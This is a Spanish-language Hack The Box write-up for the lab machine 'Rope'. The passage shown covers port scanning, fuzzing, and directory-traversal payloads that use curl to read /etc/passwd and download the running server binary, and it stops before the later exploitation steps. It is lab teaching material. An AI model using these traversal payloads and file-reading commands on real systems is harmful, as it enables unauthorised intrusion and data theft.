<!doctype html><html lang="es"><head><title>Rope | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. M谩quina insana. Esta m谩quina expone un servidor web que es vulnerable a navegaci贸n de directorios, por lo que podemos leer archivos y descubrir que se trata de un archivo binario. Despu茅s de analizar el binario, descubrimos que tiene una vulnerabilidad de Format String que puede ser explotada para conseguir RCE como john. Este usuario puede ejecutar otro binario como el usuario r4j. Este binario utiliza una librer铆a externa que podemos modificar debido a los permisos que tiene y ganar acceso como r4j. Finalmente, existe otro binario que ejecuta un servidor de sockets en local, podemos acceder al binario y analizarlo para encontrar una vulnerabilidad de Buffer Overflow. El binario tiene todas las protecciones activas, pero sigue siendo explotable para conseguir RCE como root"><meta itemprop="description" content="Hack The Box. Linux. M谩quina insana. Esta m谩quina expone un servidor web que es vulnerable a navegaci贸n de directorios, por lo que podemos leer archivos y descubrir que se trata de un archivo binario. Despu茅s de analizar el binario, descubrimos que tiene una vulnerabilidad de Format String que puede ser explotada para conseguir RCE como john. Este usuario puede ejecutar otro binario como el usuario r4j. Este binario utiliza una librer铆a externa que podemos modificar debido a los permisos que tiene y ganar acceso como r4j. Finalmente, existe otro binario que ejecuta un servidor de sockets en local, podemos acceder al binario y analizarlo para encontrar una vulnerabilidad de Buffer Overflow. El binario tiene todas las protecciones activas, pero sigue siendo explotable para conseguir RCE como root"><meta name="twitter:card" content="Hack The Box. Linux. M谩quina insana. Esta m谩quina expone un servidor web que es vulnerable a navegaci贸n de directorios, por lo que podemos leer archivos y descubrir que se trata de un archivo binario. Despu茅s de analizar el binario, descubrimos que tiene una vulnerabilidad de Format String que puede ser explotada para conseguir RCE como john. Este usuario puede ejecutar otro binario como el usuario r4j. Este binario utiliza una librer铆a externa que podemos modificar debido a los permisos que tiene y ganar acceso como r4j. Finalmente, existe otro binario que ejecuta un servidor de sockets en local, podemos acceder al binario y analizarlo para encontrar una vulnerabilidad de Buffer Overflow. El binario tiene todas las protecciones activas, pero sigue siendo explotable para conseguir RCE como root"><meta name="twitter:description" content="Hack The Box. Linux. M谩quina insana. Esta m谩quina expone un servidor web que es vulnerable a navegaci贸n de directorios, por lo que podemos leer archivos y descubrir que se trata de un archivo binario. Despu茅s de analizar el binario, descubrimos que tiene una vulnerabilidad de Format String que puede ser explotada para conseguir RCE como john. Este usuario puede ejecutar otro binario como el usuario r4j. Este binario utiliza una librer铆a externa que podemos modificar debido a los permisos que tiene y ganar acceso como r4j. Finalmente, existe otro binario que ejecuta un servidor de sockets en local, podemos acceder al binario y analizarlo para encontrar una vulnerabilidad de Buffer Overflow. El binario tiene todas las protecciones activas, pero sigue siendo explotable para conseguir RCE como root"><meta property="og:description" content="Hack The Box. Linux. M谩quina insana. Esta m谩quina expone un servidor web que es vulnerable a navegaci贸n de directorios, por lo que podemos leer archivos y descubrir que se trata de un archivo binario. Despu茅s de analizar el binario, descubrimos que tiene una vulnerabilidad de Format String que puede ser explotada para conseguir RCE como john. Este usuario puede ejecutar otro binario como el usuario r4j. Este binario utiliza una librer铆a externa que podemos modificar debido a los permisos que tiene y ganar acceso como r4j. Finalmente, existe otro binario que ejecuta un servidor de sockets en local, podemos acceder al binario y analizarlo para encontrar una vulnerabilidad de Buffer Overflow. El binario tiene todas las protecciones activas, pero sigue siendo explotable para conseguir RCE como root"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky"><meta name="twitter:author" content="7Rocky"><meta property="og:author" content="7Rocky"><meta name="image" content="https://7rocky.github.io/images/HTB/Rope/Rope.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Rope/Rope.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Rope/Rope.png"><meta property="og:site_name" content="7Rocky"><meta itemprop="name" content="Rope"><meta property="twitter:title" content="Rope"><meta property="og:title" content="Rope"><meta property="og:url" content="https://7rocky.github.io/htb/rope/"><meta itemprop="keywords" content="sudo,buffer-overflow,library-hijacking,reversing,port-forwarding,file-permissions,binary-exploitation,directory-path-traversal,static-code-analysis,rce,format-string,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/monokai-sublime.min.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/highlight.min.js"></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/rope/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedInOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHubOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/rope/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/rope/&text=Rope" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/rope/&title=Rope" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Rope</h1><time class="mt4 f6 dib tracked" datetime="2020-05-23T00:00:00+01:00">23 / 05 / 2020</time><br><p class="mb4 f6 dib tracked">39 minutos de lectura</p></header><div class="htb-image"><img alt="Rope" src="/images/HTB/Rope/Rope.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/sudo" title="sudo">sudo</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/buffer-overflow" title="Buffer Overflow">Buffer Overflow</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/library-hijacking" title="Library Hijacking">Library Hijacking</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/reversing" title="Ingenier铆a inversa">Ingenier铆a inversa</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/port-forwarding" title="Reenv铆o de puertos">Reenv铆o de puertos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/file-permissions" title="Permisos de archivos">Permisos de archivos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/binary-exploitation" title="Explotaci贸n de binarios">Explotaci贸n de binarios</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/directory-path-traversal" title="Navegaci贸n de directorios">Navegaci贸n de directorios</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/static-code-analysis" title="An谩lisis de C贸digo Est谩tico">An谩lisis de C贸digo Est谩tico</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/rce" title="Ejecuci贸n remota de comandos">Ejecuci贸n remota de comandos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/format-string" title="Vulnerabilidad de Format String">Vulnerabilidad de Format String</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeraci贸n">Enumeraci贸n</a></li><li><a href="#acceso-a-la-m谩quina">Acceso a la m谩quina</a><ul><li><a href="#explotaci贸n-de-_directory-path-traversal_">Explotaci贸n de <em>Directory Path Traversal</em></a></li><li><a href="#analizando-el-binario-httpserver">Analizando el binario <code>httpserver</code></a></li><li><a href="#preparaci贸n-del-_exploit_">Preparaci贸n del <em>exploit</em></a></li><li><a href="#explotaci贸n-de-_format-string_">Explotaci贸n de <em>Format String</em></a></li><li><a href="#obteniento-rce">Obteniento RCE</a></li></ul></li><li><a href="#movimiento-lateral-al-usuario-r4j">Movimiento lateral al usuario <code>r4j</code></a><ul><li><a href="#ataque-de-_library-hijacking_">Ataque de <em>Library Hijacking</em></a></li></ul></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#analizando-el-binario-contact">Analizando el binario <code>contact</code></a></li><li><a href="#explotaci贸n-de-_buffer-overflow_">Explotaci贸n de <em>Buffer Overflow</em></a></li><li><a href="#obteniendo-fugas-de-memoria">Obteniendo fugas de memoria</a></li><li><a href="#ataque-ret2libc">Ataque Ret2Libc</a></li><li><a href="#reenv铆o-de-puertos">Reenv铆o de puertos</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0"> <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Insana</li><li><strong>Direcci贸n IP</strong>: 10.10.10.148</li><li><strong>Fecha</strong>: 03 / 08 / 2019</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.148 -p 22,9999
Nmap scan report for 10.10.10.148
Host is up (0.058s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 56:84:89:b6:8f:0a:73:71:7f:b3:dc:31:45:59:0e:2e (RSA)
|   256 76:43:79:bc:d7:cd:c7:c7:03:94:09:ab:1f:b7:b8:2e (ECDSA)
|_  256 b3:7d:1c:27:3a:c1:78:9d:aa:11:f7:c6:50:57:25:5e (ED25519)
9999/tcp open  abyss?
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache
|     Content-length: 4871
|     Content-type: text/html
|     &lt;!DOCTYPE html&gt;
|     &lt;html lang="en"&gt;
|     &lt;head&gt;
|     &lt;title&gt;Login V10&lt;/title&gt;
|     &lt;meta charset="UTF-8"&gt;
|     &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
|     &lt;!--===============================================================================================--&gt;  
|     &lt;link rel="icon" type="image/png" href="images/icons/favicon.ico"/&gt;
|     &lt;!--===============================================================================================--&gt;
|     &lt;link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css"&gt;
|     &lt;!--===============================================================================================--&gt;
|     &lt;link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css"&gt;
|_    &lt;!--===============================================
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done -- 1 IP address (1 host up) scanned in 146.57 seconds
</code></pre></div><p>La m谩quina tiene abiertos los puertos 22 (SSH) y 9999 (HTTP).</p><h2 id="enumeraci贸n">Enumeraci贸n</h2><p>Si vamos a <code>http://10.10.10.148:9999</code>, veremos un formulario de inicio de sesi贸n:</p><p><img src="/images/HTB/Rope/Rope-login.png" alt="Rope login"></p><p>Podemos probar algunas credenciales, pero vemos &ldquo;<em>File not found</em>&rdquo;:</p><p><img src="/images/HTB/Rope/Rope-file-not-found.png" alt="Rope file not found"></p><p>Vamos a aplicar <em>fuzzing</em> para enumerar m谩s rutas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.148:9999/FUZZ  
<span class="code-dark-green">images                  [Status: 200, Size: 225, Words: 9, Lines: 3, Duration: 52ms]</span>
<span class="code-dark-green">css                     [Status: 200, Size: 317, Words: 11, Lines: 4, Duration: 298ms]</span>
<span class="code-dark-green">js                      [Status: 200, Size: 226, Words: 9, Lines: 3, Duration: 37ms]</span>
<span class="code-dark-green">vendor                  [Status: 200, Size: 1011, Words: 25, Lines: 11, Duration: 4466ms]</span>
<span class="code-dark-green">fonts                   [Status: 200, Size: 643, Words: 17, Lines: 7, Duration: 64ms]</span>
</code></pre></div><p>Si vamos a algunas de las rutas de arriba, veremos un listado de directorios:</p><p><img src="/images/HTB/Rope/Rope-vendor.png" alt="Rope vendor"></p><p>Vamos a probar con otro diccionario para probar vulnerabilidades de navegaci贸n de directorios:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/wfuzz/Injections/Traversal.txt -u http://10.10.10.148:9999/FUZZ
<span class="code-dark-green">../../../../../../../../../../../../etc/hosts [Status: 200, Size: 273, Words: 21, Lines: 10, Duration: 538ms]</span>
<span class="code-dark-green">../../../../../../../../../../../../etc/hosts%00 [Status: 200, Size: 273, Words: 21, Lines: 10, Duration: 539ms]</span>
<span class="code-dark-green">../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 539ms]</span>
<span class="code-dark-green">/../../../../../../../../../../../etc/passwd%00.jpg [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 540ms]</span>
<span class="code-dark-green">../../../../../../../../../../../../etc/passwd [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 540ms]</span>
<span class="code-dark-green">/./././././././././././etc/passwd [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 562ms]</span>
<span class="code-dark-green">/../../../../../../../../../../etc/passwd [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 577ms]</span>
<span class="code-dark-green">/../../../../../../../../../../../etc/passwd%00.html [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 577ms]</span>
<span class="code-dark-green">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 1594, Words: 9, Lines: 32, Duration: 79ms]  
</code></pre></div><p>Vaya, eso era inesperado.</p><h2 id="acceso-a-la-m谩quina">Acceso a la m谩quina</h2><p>Entonces, podemos leer <code>/etc/passwd</code> (realmente, solamente tenemos que agregar la ruta a la URL):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.10.148:9999//etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin  
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
r4j:x:1000:1000:r4j:/home/r4j:/bin/bash
john:x:1001:1001:,,,:/home/john:/bin/bash

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.10.148:9999//etc/passwd -s | <span class="code-dark-green">grep</span> sh$
root:x:0:0:root:/root:/bin/ba<span class="code-red">sh</span>
r4j:x:1000:1000:r4j:/home/r4j:/bin/ba<span class="code-red">sh</span>
john:x:1001:1001:,,,:/home/john:/bin/ba<span class="code-red">sh
</code></pre></div><p>Perfecto, hay tres usuarios disponibles en la m谩quina: <code>root</code>, <code>r4j</code> y <code>john</code>.</p><h3 id="explotaci贸n-de-_directory-path-traversal_">Explotaci贸n de <em>Directory Path Traversal</em></h3><p>En este punto, vamos a enumerar la tecnolog铆a que est谩 detr谩s del servidor web. Podemos extraer esta informaci贸n mirando en <code>/proc/self/cmdline</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.10.148:9999//proc/self/cmdline -vso -
*   Trying 10.10.10.148:9999...
* Connected to 10.10.10.148 (10.10.10.148) port 9999 (#0)
&gt; GET //proc/self/cmdline HTTP/1.1
&gt; Host: 10.10.10.148:9999
&gt; User-Agent: curl/7.84.0
&gt; Accept: */*
&gt;
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Accept-Ranges: bytes
&lt; Cache-Control: no-cache
&lt; Content-length: 0
&lt; Content-type: text/plain
&lt;
* Connection #0 to host 10.10.10.148 left intact

<span class="code-cyan">$</span> <span class="code-dark-green">nc</span> 10.10.10.148 9999 &lt;&lt;&lt; <span class="code-dark-yellow">$'GET //proc/self/cmdline HTTP/1.1<span class="code-dark-cyan">\n\n</span>'</span>  
HTTP/1.1 200 OK
Accept-Ranges: bytes
Cache-Control: no-cache
Content-length: 0
Content-type: text/plain
</code></pre></div><p>Pero no sale nada&mldr; Vamos a listar el directorio <code>/proc/self</code>:</p><p><img src="/images/HTB/Rope/Rope-proc-self.png" alt="Rope /proc/self"></p><p>Parece que todos los archivos est谩n vac铆os, a excepci贸n de <code>/proc/self/exe</code>, que es un enlace simb贸lico al binario que est谩 siendo ejecutado.</p><p>Podemos descargarlo y analizarlo. De hecho, se trata de un ELF de 32 bits:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.10.148:9999//proc/self/exe -so exe

<span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">exe</span>
content/exe: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e4e105bd11d096b41b365fa5c0429788f2dd73c3, not stripped  
</code></pre></div><p>Adem谩s, podemos acceder a <code>/proc/self/cwd</code> y listar todos los archivos en el directorio actual de trabajo del binario:</p><p><img src="/images/HTB/Rope/Rope-proc-self-cwd.png" alt="Rope /proc/self/cwd"></p><p>El binario se llama <code>httpserver</code>, y usa <code>run.sh</code> para correr (obviamente):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 10.10.10.148:9999//proc/self/cwd/run.sh  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/bash</span>
